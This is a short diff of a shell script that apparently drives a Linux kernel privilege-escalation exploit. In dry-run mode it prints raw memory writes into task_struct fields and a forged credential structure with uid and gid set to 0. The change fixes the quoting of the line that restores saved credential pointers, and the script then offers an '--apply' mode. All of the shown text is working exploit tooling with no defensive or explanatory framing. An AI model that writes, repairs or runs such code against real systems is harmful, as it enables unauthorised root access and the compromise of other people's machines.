@@ -147,7 +147,9 @@ if [ "$APPLY" != 1 ]; then
     echo "0x$(addoff "$T" 0x898)  00000000000000000000000000000000   # pi_waiters.rb_node + rb_leftmost"
     echo "0x$(addoff "$T" 0x8a8)  00000000000000000000000000000000   # pi_top_task + pi_blocked_on"
     echo "0x$IC  04000000000000000000000000000000   # usage=4, uid=gid=0"
-    echo "0x$(addoff "$T" 0x790)  $(le "$field "$RC_SAVE")$(le "$field "$CR_SAVE")   # creds back to the backup"
+    LE_RC=$(le "$(field "$RC_SAVE")")
+    LE_CR=$(le "$(field "$CR_SAVE")")
+    echo "0x$(addoff "$T" 0x790)  ${LE_RC}${LE_CR}   # creds back to the backup"
     echo "(re-run with --apply)"
     exit 0
 fi
